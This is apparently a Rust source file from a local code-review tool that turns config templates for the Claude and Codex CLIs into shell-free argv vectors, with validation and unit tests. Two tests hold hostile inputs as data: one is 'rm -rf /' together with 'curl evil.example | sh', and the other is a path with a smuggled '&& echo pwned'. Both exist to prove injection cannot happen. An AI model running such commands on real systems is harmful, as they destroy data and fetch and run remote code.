//! Config-driven invocation templates (SPEC §8.4).
//!
//! §8.4: *"Invocations are config-driven templates, not hardcoded, because CLI
//! flags drift."* The Claude and Codex defaults ship here, but they are **defaults**
//! — a user whose CLI changed a flag edits config rather than waiting for a release.
//!
//! # There is no shell
//!
//! A rendered template is a program plus an **argv vector**, handed to
//! `Command::new(program).args(argv)`. Nothing is ever concatenated into a command
//! line and nothing is passed to `sh -c`. That is the whole answer to injection:
//! a prompt containing `; rm -rf /`, a repository path containing a space, a
//! filename containing a quote — each is **one argv element**, because argv has no
//! syntax for it to escape into.
//!
//! This is worth stating rather than assuming, because the alternative is so easy
//! to reach for: one `format!("{bin} {args}")` anywhere in the runner and every
//! prompt becomes a shell script. The test
//! `template_a_prompt_full_of_shell_metacharacters_is_one_argument` is the guard.
//!
//! # Unknown placeholders fail at load, not at run
//!
//! A typo'd `{out-dir}` that only failed when a review started would fail at 3am on
//! a poll, having already spent a scratch worktree. [`InvocationTemplate::validate`]
//! is meant to run when config is loaded.

use std::collections::BTreeSet;
use std::path::PathBuf;
use std::time::Duration;

/// Every placeholder a template may use (SPEC §8.4).
pub const PLACEHOLDERS: &[&str] = &[
    "cwd",
    "out_dir",
    "prompt_file",
    "prompt_file_content",
    "timeout_secs",
];

/// How an engine is invoked.
#[derive(Debug, Clone, PartialEq, Eq, serde::Serialize, serde::Deserialize)]
#[serde(default)]
pub struct InvocationTemplate {
    /// The executable.
    pub bin: String,
    /// Arguments, with placeholders.
    pub args: Vec<String>,
    /// Arguments that make the engine print its version (§8.4).
    pub version_args: Vec<String>,
    /// Whether the prompt is written to stdin instead of appearing in argv.
    pub stdin_prompt: bool,
    /// Environment variables to pass through §8.5's denylist.
    ///
    /// Held here because it is part of *how this engine is invoked*; the filtering
    /// itself belongs to the runner that spawns the process.
    pub pass_env: Vec<String>,
}

impl Default for InvocationTemplate {
    fn default() -> Self {
        Self {
            bin: String::new(),
            args: Vec::new(),
            version_args: vec!["--version".to_owned()],
            stdin_prompt: false,
            pass_env: Vec::new(),
        }
    }
}

/// Everything a template can interpolate.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RenderContext {
    /// The materialized worktree.
    pub cwd: PathBuf,
    /// The only writable path (§8.2).
    pub out_dir: PathBuf,
    /// Where the prompt was written, for templates that pass a path.
    pub prompt_file: PathBuf,
    /// The prompt itself, for templates that pass it inline or on stdin.
    pub prompt: String,
    /// The wall-clock limit (§8.5).
    pub timeout: Duration,
}

/// A rendered invocation, ready to spawn.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct Invocation {
    /// The program to run.
    pub program: String,
    /// Arguments, **already separated**. Never a command line.
    pub args: Vec<String>,
    /// What to write to the child's stdin, if anything.
    pub stdin: Option<String>,
}

/// Why a template cannot be used.
#[derive(Debug, Clone, PartialEq, Eq, thiserror::Error)]
pub enum TemplateError {
    /// A placeholder this build does not know.
    #[error(
        "unknown placeholder `{{{name}}}` in the `{engine}` invocation template\n  \
         try: use one of {}",
        known.join(", ")
    )]
    UnknownPlaceholder {
        /// Which engine's template.
        engine: String,
        /// The placeholder as written.
        name: String,
        /// What is available.
        known: Vec<String>,
    },

    /// A `{` with no matching `}`.
    #[error(
        "unclosed `{{` in the `{engine}` invocation template, in argument {index}: {arg}\n  \
         try: write `{{{{` for a literal brace"
    )]
    UnclosedPlaceholder {
        /// Which engine's template.
        engine: String,
        /// Which argument.
        index: usize,
        /// The argument as written.
        arg: String,
    },

    /// The template has no executable.
    #[error("the `{engine}` invocation template has no `bin`\n  try: set `bin` to the CLI's executable name")]
    NoBinary {
        /// Which engine's template.
        engine: String,
    },

    /// The prompt would never reach the engine.
    #[error(
        "the `{engine}` invocation template never delivers the prompt\n  \
         try: reference `{{prompt_file_content}}` or `{{prompt_file}}` in `args`, \
         or set `stdin_prompt = true`"
    )]
    PromptNeverDelivered {
        /// Which engine's template.
        engine: String,
    },

    /// The prompt would reach the engine twice.
    #[error(
        "the `{engine}` invocation template delivers the prompt twice: `stdin_prompt` \
         is set and `args` also references `{{{via}}}`\n  \
         try: choose one; sending both makes the engine review the change twice over"
    )]
    PromptDeliveredTwice {
        /// Which engine's template.
        engine: String,
        /// The placeholder that also carries it.
        via: String,
    },
}

impl InvocationTemplate {
    /// SPEC §8.4's default for Claude Code.
    pub fn claude() -> Self {
        Self {
            bin: "claude".to_owned(),
            args: vec![
                "-p".to_owned(),
                "{prompt_file_content}".to_owned(),
                "--output-format".to_owned(),
                "json".to_owned(),
                "--permission-mode".to_owned(),
                "acceptEdits".to_owned(),
                "--add-dir".to_owned(),
                "{out_dir}".to_owned(),
            ],
            version_args: vec!["--version".to_owned()],
            stdin_prompt: false,
            pass_env: Vec::new(),
        }
    }

    /// SPEC §8.4's default for Codex.
    pub fn codex() -> Self {
        Self {
            bin: "codex".to_owned(),
            args: vec![
                "exec".to_owned(),
                "--json".to_owned(),
                "--sandbox".to_owned(),
                "workspace-write".to_owned(),
                "--cd".to_owned(),
                "{cwd}".to_owned(),
                "{prompt_file_content}".to_owned(),
            ],
            version_args: vec!["--version".to_owned()],
            stdin_prompt: false,
            pass_env: Vec::new(),
        }
    }

    /// The default template for an engine id, if one ships.
    pub fn default_for(id: revlocal_core::EngineKind) -> Option<Self> {
        match id {
            revlocal_core::EngineKind::Claude => Some(Self::claude()),
            revlocal_core::EngineKind::Codex => Some(Self::codex()),
            // The mock is a fixture, invoked by tests that know where it is.
            revlocal_core::EngineKind::Mock => None,
        }
    }

    /// Check the template before anything depends on it.
    ///
    /// Meant to run when config is loaded. A typo'd `{out-dir}` that only failed
    /// when a review started would fail at 3am on a poll, having already spent a
    /// scratch worktree materializing the change.
    pub fn validate(&self, engine: &str) -> Result<(), TemplateError> {
        if self.bin.trim().is_empty() {
            return Err(TemplateError::NoBinary {
                engine: engine.to_owned(),
            });
        }

        let mut used: BTreeSet<String> = BTreeSet::new();
        for (index, arg) in self.args.iter().enumerate() {
            for name in placeholders_in(arg).map_err(|_| TemplateError::UnclosedPlaceholder {
                engine: engine.to_owned(),
                index,
                arg: arg.clone(),
            })? {
                if !PLACEHOLDERS.contains(&name.as_str()) {
                    return Err(TemplateError::UnknownPlaceholder {
                        engine: engine.to_owned(),
                        name,
                        known: PLACEHOLDERS.iter().map(|p| (*p).to_owned()).collect(),
                    });
                }
                used.insert(name);
            }
        }

        // §8.4 decides how the prompt travels by what the template references. A
        // template that references neither and does not use stdin would run the
        // engine with no prompt at all — which produces a plausible-looking empty
        // review rather than an error.
        let inline = used.contains("prompt_file_content");
        let by_file = used.contains("prompt_file");

        if self.stdin_prompt {
            if inline {
                return Err(TemplateError::PromptDeliveredTwice {
                    engine: engine.to_owned(),
                    via: "prompt_file_content".to_owned(),
                });
            }
            if by_file {
                return Err(TemplateError::PromptDeliveredTwice {
                    engine: engine.to_owned(),
                    via: "prompt_file".to_owned(),
                });
            }
        } else if !inline && !by_file {
            return Err(TemplateError::PromptNeverDelivered {
                engine: engine.to_owned(),
            });
        }

        Ok(())
    }

    /// Render the template into a spawnable invocation.
    ///
    /// Every argument is rendered **whole**. A value containing spaces, quotes or
    /// semicolons stays one argv element, because argv has no syntax for it to
    /// escape into — see this module's header.
    pub fn render(
        &self,
        engine: &str,
        context: &RenderContext,
    ) -> Result<Invocation, TemplateError> {
        self.validate(engine)?;

        let mut args = Vec::with_capacity(self.args.len());
        for (index, arg) in self.args.iter().enumerate() {
            args.push(substitute(arg, context).map_err(|_| {
                TemplateError::UnclosedPlaceholder {
                    engine: engine.to_owned(),
                    index,
                    arg: arg.clone(),
                }
            })?);
        }

        Ok(Invocation {
            program: self.bin.clone(),
            args,
            stdin: self.stdin_prompt.then(|| context.prompt.clone()),
        })
    }
}

/// The placeholder names an argument uses.
///
/// `{{` and `}}` are literal braces, so a template can pass JSON or a shell-looking
/// string without every `{` being read as a placeholder.
fn placeholders_in(arg: &str) -> Result<Vec<String>, ()> {
    let mut names = Vec::new();
    let mut chars = arg.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '{' if chars.peek() == Some(&'{') => {
                chars.next();
            }
            '}' if chars.peek() == Some(&'}') => {
                chars.next();
            }
            '{' => {
                let mut name = String::new();
                let mut closed = false;
                for c in chars.by_ref() {
                    if c == '}' {
                        closed = true;
                        break;
                    }
                    name.push(c);
                }
                if !closed {
                    return Err(());
                }
                names.push(name);
            }
            _ => {}
        }
    }
    Ok(names)
}

/// Replace placeholders in one argument.
fn substitute(arg: &str, context: &RenderContext) -> Result<String, ()> {
    let mut out = String::with_capacity(arg.len());
    let mut chars = arg.chars().peekable();

    while let Some(c) = chars.next() {
        match c {
            '{' if chars.peek() == Some(&'{') => {
                chars.next();
                out.push('{');
            }
            '}' if chars.peek() == Some(&'}') => {
                chars.next();
                out.push('}');
            }
            '{' => {
                let mut name = String::new();
                let mut closed = false;
                for c in chars.by_ref() {
                    if c == '}' {
                        closed = true;
                        break;
                    }
                    name.push(c);
                }
                if !closed {
                    return Err(());
                }
                out.push_str(&value_of(&name, context));
            }
            other => out.push(other),
        }
    }
    Ok(out)
}

/// One placeholder's value.
///
/// Paths go through `Path::display`, which is lossy for non-UTF-8 — but a path that
/// cannot round-trip through the template is one the engine could not be told about
/// anyway, and losing it silently here beats refusing to review the repository.
fn value_of(name: &str, context: &RenderContext) -> String {
    match name {
        "cwd" => context.cwd.display().to_string(),
        "out_dir" => context.out_dir.display().to_string(),
        "prompt_file" => context.prompt_file.display().to_string(),
        "prompt_file_content" => context.prompt.clone(),
        "timeout_secs" => context.timeout.as_secs().to_string(),
        // Unreachable: validate() rejects unknown names before render() runs.
        _ => String::new(),
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn context() -> RenderContext {
        RenderContext {
            cwd: PathBuf::from("/scratch/1/worktree"),
            out_dir: PathBuf::from("/scratch/1/out"),
            prompt_file: PathBuf::from("/scratch/1/out/prompt.md"),
            prompt: "Review this change.".to_owned(),
            timeout: Duration::from_secs(600),
        }
    }

    /// A template with exactly these args, valid or not.
    ///
    /// Used where the point IS validity — a template with no prompt reference is a
    /// config error, and several tests below rely on that.
    fn template(args: &[&str]) -> InvocationTemplate {
        InvocationTemplate {
            bin: "engine".to_owned(),
            args: args.iter().map(|a| (*a).to_owned()).collect(),
            ..InvocationTemplate::default()
        }
    }

    /// Render `args` and return only those arguments, with prompt delivery satisfied.
    ///
    /// The delivery rule is a real one (a template that never passes the prompt is
    /// rejected), so a test about *rendering* has to satisfy it without letting the
    /// extra argument clutter its assertions.
    fn render_args(args: &[&str]) -> Vec<String> {
        render_args_with(args, &context())
    }

    fn render_args_with(args: &[&str], context: &RenderContext) -> Vec<String> {
        let mut with_prompt: Vec<&str> = args.to_vec();
        with_prompt.push("{prompt_file_content}");

        let mut rendered = template(&with_prompt)
            .render("test", context)
            .unwrap_or_else(|e| panic!("{e}"))
            .args;
        rendered.pop();
        rendered
    }

    // --- placeholders render --------------------------------------------------

    #[test]
    fn template_every_placeholder_renders() {
        let rendered = template(&[
            "{cwd}",
            "{out_dir}",
            "{prompt_file}",
            "{prompt_file_content}",
            "{timeout_secs}",
        ])
        .render("test", &context())
        .unwrap_or_else(|e| panic!("{e}"));

        assert_eq!(
            rendered.args,
            [
                "/scratch/1/worktree",
                "/scratch/1/out",
                "/scratch/1/out/prompt.md",
                "Review this change.",
                "600",
            ]
        );
        assert_eq!(rendered.program, "engine");
        assert_eq!(rendered.stdin, None);
    }

    #[test]
    fn template_a_placeholder_inside_a_larger_argument_renders_in_place() {
        // `--out={out_dir}/result.json` is a shape real CLIs use, and it must stay
        // ONE argument.
        assert_eq!(
            render_args(&["--out={out_dir}/result.json"]),
            ["--out=/scratch/1/out/result.json"]
        );
    }

    #[test]
    fn template_a_doubled_brace_is_a_literal_brace() {
        // Without an escape, a template that needed to pass `{"json": true}` would
        // have every `{` read as a placeholder.
        assert_eq!(
            render_args(&["--filter={{\"kind\":\"pr\"}}"]),
            ["--filter={\"kind\":\"pr\"}"]
        );
    }

    // --- paths with spaces, and Windows ---------------------------------------

    #[test]
    fn template_a_path_with_spaces_stays_one_argument() {
        // Acceptance criterion 1. On Windows this is the normal case, not an edge
        // one: `C:\Users\Some One\Documents\repo`.
        let mut ctx = context();
        ctx.cwd = PathBuf::from(r"C:\Users\Some One\Documents\my repo");
        ctx.out_dir = PathBuf::from(r"C:\Users\Some One\AppData\Local\rev-local\scratch\1");

        let args = render_args_with(&["--cd", "{cwd}", "--add-dir", "{out_dir}"], &ctx);

        assert_eq!(args.len(), 4, "spaces must not split an argument");
        assert_eq!(args[1], r"C:\Users\Some One\Documents\my repo");
        assert!(
            args[3].contains("Some One"),
            "the space survives intact: {}",
            args[3]
        );
    }

    #[test]
    fn template_a_backslash_path_is_not_treated_as_an_escape() {
        // Rendering must be textual. A path like `C:\temp\new` contains `\t` and
        // `\n`; anything that processed escapes would corrupt it into a tab and a
        // newline, and the engine would be pointed at a directory that does not
        // exist.
        let mut ctx = context();
        ctx.cwd = PathBuf::from(r"C:\temp\new\repo");

        let args = render_args_with(&["{cwd}"], &ctx);
        assert_eq!(args[0], r"C:\temp\new\repo");
        assert!(
            !args[0].contains('\t'),
            "a tab means escapes were processed"
        );
        assert!(!args[0].contains('\n'));
    }

    // --- there is no shell ----------------------------------------------------

    #[test]
    fn template_a_prompt_full_of_shell_metacharacters_is_one_argument() {
        // Acceptance criterion 3, and the property the whole module rests on. The
        // prompt is attacker-influenced in the ordinary case: it contains the diff,
        // and the diff contains whatever someone pushed.
        let mut ctx = context();
        ctx.prompt = "Review this.\n; rm -rf / #\n$(whoami) `id` && curl evil.example | sh\n\
                      'quoted' \"double\" \\backslash"
            .to_owned();

        let rendered = template(&["-p", "{prompt_file_content}"])
            .render("test", &ctx)
            .unwrap_or_else(|e| panic!("{e}"));

        assert_eq!(
            rendered.args.len(),
            2,
            "the prompt must be exactly one argv element, whatever is in it"
        );
        assert_eq!(
            rendered.args[1], ctx.prompt,
            "and must reach the engine byte-identical"
        );
    }

    #[test]
    fn template_a_repository_path_containing_a_semicolon_is_one_argument() {
        // A directory can legitimately be called `weird;name` on POSIX.
        let mut ctx = context();
        ctx.cwd = PathBuf::from("/repos/weird;name && echo pwned");

        let args = render_args_with(&["--cd", "{cwd}"], &ctx);
        assert_eq!(args.len(), 2);
        assert_eq!(args[1], "/repos/weird;name && echo pwned");
    }

    #[test]
    fn template_rendering_produces_argv_not_a_command_line() {
        // The structural guarantee: there is no field on Invocation that could be
        // handed to a shell. If someone adds one, this test is where it should be
        // reconsidered.
        let rendered = template(&["-p", "{prompt_file_content}"])
            .render("test", &context())
            .unwrap_or_else(|e| panic!("{e}"));

        // program + args, separately. Nothing joins them.
        assert!(
            !rendered.program.contains(' '),
            "the program is a path, not a command line"
        );
        assert_eq!(rendered.args.len(), 2);
    }

    // --- unknown placeholders fail at load ------------------------------------

    #[test]
    fn template_an_unknown_placeholder_is_rejected_before_anything_runs() {
        // Acceptance criterion 2. A typo that only failed when a review started
        // would fail at 3am on a poll, having already spent a scratch worktree
        // materializing the change.
        let error = template(&["--out", "{out-dir}", "{prompt_file_content}"])
            .validate("claude")
            .expect_err("a typo'd placeholder must be caught");

        match &error {
            TemplateError::UnknownPlaceholder {
                name,
                engine,
                known,
            } => {
                assert_eq!(name, "out-dir");
                assert_eq!(
                    engine, "claude",
                    "the error must name which engine's template"
                );
                assert!(
                    known.contains(&"out_dir".to_owned()),
                    "and list the real ones"
                );
            }
            other => panic!("expected an unknown placeholder, got {other:?}"),
        }
        assert!(error.to_string().contains("try:"), "{error}");
    }

    #[test]
    fn template_an_unclosed_brace_is_rejected_with_the_argument_that_has_it() {
        let error = template(&["--out", "{out_dir", "{prompt_file_content}"])
            .validate("claude")
            .expect_err("an unclosed brace must be caught");
        assert!(
            matches!(error, TemplateError::UnclosedPlaceholder { .. }),
            "{error:?}"
        );
        assert!(
            error.to_string().contains("{{"),
            "the remedy is to escape it, and the message should say so: {error}"
        );
    }

    #[test]
    fn template_render_validates_too_so_a_bad_template_cannot_slip_through() {
        // Belt and braces: even if a caller skips validate(), render() will not
        // silently substitute an empty string for a typo.
        assert!(template(&["{nope}"]).render("test", &context()).is_err());
    }

    #[test]
    fn template_a_missing_binary_is_a_config_error() {
        let mut bad = template(&["{prompt_file_content}"]);
        bad.bin = "  ".to_owned();
        assert!(matches!(
            bad.validate("x"),
            Err(TemplateError::NoBinary { .. })
        ));
    }

    // --- the prompt must arrive, exactly once ---------------------------------

    #[test]
    fn template_a_template_that_never_delivers_the_prompt_is_rejected() {
        // The failure this catches is quiet: an engine run with no prompt produces a
        // plausible-looking empty review rather than an error, and the run would be
        // recorded as a clean pass.
        let error = template(&["--json", "--cd", "{cwd}"])
            .validate("codex")
            .expect_err("the prompt would never arrive");
        assert!(
            matches!(error, TemplateError::PromptNeverDelivered { .. }),
            "{error:?}"
        );
    }

    #[test]
    fn template_stdin_prompt_satisfies_the_delivery_requirement() {
        let mut stdin_template = template(&["--cd", "{cwd}"]);
        stdin_template.stdin_prompt = true;

        let rendered = stdin_template
            .render("test", &context())
            .unwrap_or_else(|e| panic!("{e}"));
        assert_eq!(rendered.stdin.as_deref(), Some("Review this change."));
        assert!(
            !rendered
                .args
                .iter()
                .any(|a| a.contains("Review this change.")),
            "the prompt must not ALSO be in argv"
        );
    }

    #[test]
    fn template_delivering_the_prompt_twice_is_rejected() {
        // Sending it inline and on stdin makes the engine review the change twice
        // over, at double the token cost, for one review.
        let mut both = template(&["-p", "{prompt_file_content}"]);
        both.stdin_prompt = true;

        let error = both
            .validate("claude")
            .expect_err("two deliveries must be refused");
        match &error {
            TemplateError::PromptDeliveredTwice { via, .. } => {
                assert_eq!(via, "prompt_file_content");
            }
            other => panic!("expected a double delivery, got {other:?}"),
        }
        assert!(error.to_string().contains("twice"), "{error}");
    }

    #[test]
    fn template_a_prompt_file_reference_also_counts_as_delivery() {
        // §8.4: referencing {prompt_file} passes a path instead of the text.
        let by_file = template(&["--prompt-file", "{prompt_file}"]);
        by_file.validate("test").unwrap_or_else(|e| panic!("{e}"));

        let rendered = by_file
            .render("test", &context())
            .unwrap_or_else(|e| panic!("{e}"));
        assert_eq!(rendered.args[1], "/scratch/1/out/prompt.md");
        assert_eq!(rendered.stdin, None);
    }

    // --- the shipped defaults --------------------------------------------------

    #[test]
    fn template_the_shipped_defaults_match_spec_8_4() {
        // They are DEFAULTS, not assumptions — a user whose CLI changed a flag edits
        // config. But they have to be right on a fresh install, and §8.4 prints them.
        let claude = InvocationTemplate::claude();
        assert_eq!(claude.bin, "claude");
        assert_eq!(
            claude.args,
            [
                "-p",
                "{prompt_file_content}",
                "--output-format",
                "json",
                "--permission-mode",
                "acceptEdits",
                "--add-dir",
                "{out_dir}",
            ]
        );
        assert!(!claude.stdin_prompt);

        let codex = InvocationTemplate::codex();
        assert_eq!(codex.bin, "codex");
        assert_eq!(codex.args[0], "exec");
        assert!(codex.args.contains(&"{cwd}".to_owned()));
        assert!(codex.args.contains(&"{prompt_file_content}".to_owned()));
    }

    #[test]
    fn template_both_shipped_defaults_validate() {
        // A default that fails its own validator would break every fresh install,
        // and the message would blame the user's config.
        InvocationTemplate::claude()
            .validate("claude")
            .unwrap_or_else(|e| panic!("the shipped claude template is invalid: {e}"));
        InvocationTemplate::codex()
            .validate("codex")
            .unwrap_or_else(|e| panic!("the shipped codex template is invalid: {e}"));
    }

    #[test]
    fn template_both_shipped_defaults_render() {
        for (name, template) in [
            ("claude", InvocationTemplate::claude()),
            ("codex", InvocationTemplate::codex()),
        ] {
            let rendered = template
                .render(name, &context())
                .unwrap_or_else(|e| panic!("{name}: {e}"));
            assert!(
                rendered.args.iter().any(|a| a == "Review this change."),
                "{name} must pass the prompt: {:?}",
                rendered.args
            );
        }
    }

    #[test]
    fn template_the_mock_ships_no_default_because_it_is_a_fixture() {
        assert!(InvocationTemplate::default_for(revlocal_core::EngineKind::Mock).is_none());
        assert!(InvocationTemplate::default_for(revlocal_core::EngineKind::Claude).is_some());
    }

    #[test]
    fn template_a_template_round_trips_through_config() {
        // §8.4 puts these in `[engines.<id>]`. They must survive being written and
        // read back, or a user's edit would be silently discarded on restart.
        let original = InvocationTemplate::claude();
        let toml = toml::to_string(&original).unwrap_or_default();
        let back: InvocationTemplate =
            toml::from_str(&toml).unwrap_or_else(|e| panic!("{e}\n{toml}"));
        assert_eq!(back, original);
    }

    #[test]
    fn template_a_partial_config_table_fills_in_defaults() {
        // A user overriding one flag should not have to restate the whole template.
        let partial: InvocationTemplate = toml::from_str(
            r#"
bin = "claude"
args = ["-p", "{prompt_file_content}"]
"#,
        )
        .unwrap_or_else(|e| panic!("{e}"));

        assert_eq!(partial.version_args, ["--version"], "the default survives");
        assert!(!partial.stdin_prompt);
        partial.validate("claude").unwrap_or_else(|e| panic!("{e}"));
    }
}
